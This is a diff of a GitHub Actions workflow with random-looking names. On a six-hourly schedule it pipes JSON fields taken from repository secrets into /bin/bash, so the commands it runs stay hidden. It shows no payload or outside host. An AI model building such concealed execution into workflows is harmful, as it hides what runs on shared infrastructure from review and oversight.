@@ -3,32 +3,26 @@ name: yingjinchaoshang
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 1/6 * * *'
+    - cron: '23 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yingjinchaoshang
         env:
-          uy58: ${{ secrets.uy58 }}
+          nn75565: ${{ secrets.nn75565 }}
         run: |
-          echo $uy58 | jq -r .ysopi988 | /bin/bash
-          echo $j5 | jq -r .mo7 | /bin/bash
-          echo $erslk9295 | jq -r .iwisa99 | /bin/bash
-          echo $uha868 | jq -r .uv84843 | /bin/bash
-          echo $hx2 | jq -r .rnq50246 | /bin/bash
-          echo $nani9143 | jq -r .hk44 | /bin/bash
-          echo $oqaet4229 | jq -r .ll40269 | /bin/bash
-          echo $uvkb8212 | jq -r .jzkxn66944 | /bin/bash
-          echo $le714 | jq -r .vo638 | /bin/bash
-          echo $t44 | jq -r .ggcu88718 | /bin/bash
-          echo $nhdp2 | jq -r .d1310 | /bin/bash
-          echo $quksl16375 | jq -r .a416 | /bin/bash
-          echo $z8 | jq -r .zfd20 | /bin/bash
-          echo $ybfjq23627 | jq -r .mqtbf97131 | /bin/bash
-          echo $aarx22 | jq -r .qqa5 | /bin/bash
-          echo $jtn1 | jq -r .pt303 | /bin/bash
-          echo $f88 | jq -r .lfjh13730 | /bin/bash
-          echo $haav58767 | jq -r .gsxg3779 | /bin/bash
+          echo $nn75565 | jq -r .vajkk3377 | /bin/bash
+          echo $wtjo2791 | jq -r .tdf10420 | /bin/bash
+          echo $rdctp8514 | jq -r .fj36 | /bin/bash
+          echo $mt295 | jq -r .tmvy8317 | /bin/bash
+          echo $cxarc34630 | jq -r .pn07707 | /bin/bash
+          echo $wgdv3 | jq -r .qymu8253 | /bin/bash
+          echo $aymb95 | jq -r .uap6454 | /bin/bash
+          echo $tve3439 | jq -r .mi6713 | /bin/bash
+          echo $ocbcz62723 | jq -r .qdetl42 | /bin/bash
+          echo $upyy18608 | jq -r .tdgz68861 | /bin/bash
 
